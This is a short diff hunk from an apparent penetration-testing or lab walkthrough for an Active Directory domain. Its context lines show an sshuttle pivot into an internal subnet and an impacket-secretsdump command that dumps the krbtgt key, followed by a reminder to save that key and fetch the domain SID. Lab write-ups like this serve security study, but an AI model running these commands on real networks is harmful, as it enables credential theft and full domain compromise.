@@ -496,7 +496,7 @@ sshuttle -r josh@TARGET_IP 172.16.20.0/24
 impacket-secretsdump 'darkzero.ext/celia:<CELIA_PW>@172.16.20.2' -just-dc-user krbtgt
 ```
 
-⚠ save the krbtgt **aes256** key. Get the source domain SID:
+> ⚠ save the krbtgt **aes256** key. Get the source domain SID:
 
 ```bash
 # SRV01 root:
